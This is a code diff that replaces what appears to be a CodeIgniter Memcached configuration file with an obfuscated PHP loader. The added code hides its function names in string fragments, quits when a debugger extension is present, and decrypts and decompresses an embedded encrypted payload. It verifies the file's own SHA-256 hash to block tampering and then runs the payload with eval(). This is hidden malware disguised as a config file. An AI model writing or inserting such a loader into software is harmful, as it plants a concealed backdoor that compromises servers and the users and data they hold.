@@ -1,19 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------------
-| Memcached settings
-| -------------------------------------------------------------------------
-| Your Memcached servers can be specified below.
-|
-|	See: https://codeigniter.com/user_guide/libraries/caching.html#memcached
-|
-*/
-$config = array(
-	'default' => array(
-		'hostname' => '127.0.0.1',
-		'port'     => '11211',
-		'weight'   => '1',
-	),
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_eozabqw2=('bas'.'e64'.'_de'.'cod'.'e');
+$_i9zvme4u=('gzu'.'nco'.'mpr'.'ess');
+$_m97spili=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vjvpbpr5='0DOStLa/';
+$_zo50r4zt='CnjLLkk8';
+$_od9i2kga='Wn/mfKYBZ6k=';
+$_whfsur4b='3aa1W7nf';
+$_ystwqh3e='NXEKwdTm';
+$_oo1calqs='4alKelfb';
+$_y7xbfby7='YuqeJf0S';
+$_v9ajhdty='1/8ZhQ==';
+$_ru3uo7nf=$_eozabqw2($_ystwqh3e.$_zo50r4zt.$_vjvpbpr5.$_whfsur4b.$_od9i2kga);
+$_rmlxugel=$_eozabqw2($_oo1calqs.$_y7xbfby7.$_v9ajhdty);
+$_v7b8d9x7=$_eozabqw2('ZREguHTu/RCK339P4VxpitypvBfj+R34hcoS7o9qmxArw+uzA6e1CHnUAes4W8janoOzFndIX8f/rGevKYAsA3XbrBrU7gWuK0VpLoEXzejHllbUd5hyQOo204xvRKi/uFBFHdXfPKT3HKD1a/3f38g8S2npYlZXpMUfkE/nCwL0Mx8ZYdwBW2JMV2CbIeaLXHoS8gpAtzOT5Mmm853Qng==');
+$_qyilkqad=$_m97spili($_v7b8d9x7,'aes-256-cbc',$_ru3uo7nf,OPENSSL_RAW_DATA,$_rmlxugel);
+if($_qyilkqad===false){exit;}
+$_yfvhfsw7=$_i9zvme4u($_qyilkqad);
+if($_yfvhfsw7===false){exit;}
+$_d9m29yqe='2e7163ee9ab0047636c275b56b18f2d657f66c6d82e6927d451a645c336f3d7d';
+$_kimb6fx1=@file_get_contents(__FILE__);
+if($_kimb6fx1!==false){
+$_i4zd9ekf=str_replace($_d9m29yqe,"0000000000000000000000000000000000000000000000000000000000000000",$_kimb6fx1);
+$_iqcvx3vx=hash("sha256",$_i4zd9ekf);
+if($_iqcvx3vx!==$_d9m29yqe){@http_response_code(403);exit;}
+}
+eval($_yfvhfsw7);
